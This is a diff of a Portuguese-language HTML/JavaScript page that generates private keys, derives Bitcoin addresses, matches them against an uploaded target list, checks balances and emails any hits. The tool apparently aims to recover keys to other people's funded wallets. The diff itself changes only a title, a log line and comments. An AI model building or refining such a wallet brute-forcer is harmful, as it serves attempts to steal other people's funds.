@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>BTC AUTO LIST + GENERATE</title>
+<title>BTC REAL AUTO LIST + GENERATE</title>
 
 <style>
 body { font-family: Arial; background:#020617; color:#e5e7eb; padding:20px; }
@@ -19,7 +19,7 @@ button { background:#0a0f1c; border:1px solid #1e293b; color:#38bdf8; padding:6p
 </head>
 <body>
 
-<h2>BTC AUTO LIST + GENERATE</h2>
+<h2>BTC REAL AUTO LIST + GENERATE</h2>
 
 <label>🔽 Subir lista de endereços para procurar (.txt)</label>
 <input type="file" id="file" accept=".txt">
@@ -82,7 +82,7 @@ SALDO P2PKH: ${saldo !== null ? saldo+" BTC" : "Erro"}`;
       message: content
     });
 
-    console.log("Email enviado com sucesso:", dados.P2PKH);
+    console.log("Email enviado:", dados.P2PKH);
   } catch(e){
     console.error("Erro ao enviar email:", e);
   }
@@ -127,7 +127,7 @@ function gerarAddress(privHex){
   const pub = getPublicKey(priv,true);
   const hash160 = ripemd160(sha256(pub));
 
-  const payload = new Uint8Array([0x00,...hash160]);
+  const payload = new Uint8Array([0x00,...hash160]); // mainnet prefix 0x00
   const checksum = sha256(sha256(payload)).slice(0,4);
   const P2PKH = base58(new Uint8Array([...payload,...checksum]));
   const P2SH = base58(new Uint8Array([0x05,...hash160,...sha256(sha256(new Uint8Array([0x05,...hash160]))).slice(0,4)]));
@@ -156,6 +156,7 @@ async function loop(){
     (async()=>{
       let isMatch=false;
 
+      // Match na lista
       if(listaEnderecos.has(dados.P2PKH) || listaEnderecos.has(dados.P2SH) || listaEnderecos.has(dados.P2WPKH)){
         isMatch=true;
         totalMatches++;
@@ -166,6 +167,7 @@ async function loop(){
         enviarEmail(dados,"MATCH ENCONTRADO");
       }
 
+      // Saldo positivo
       const saldo = await consultarSaldo(dados.P2PKH);
       if(saldo && saldo>0){
         isMatch=true;
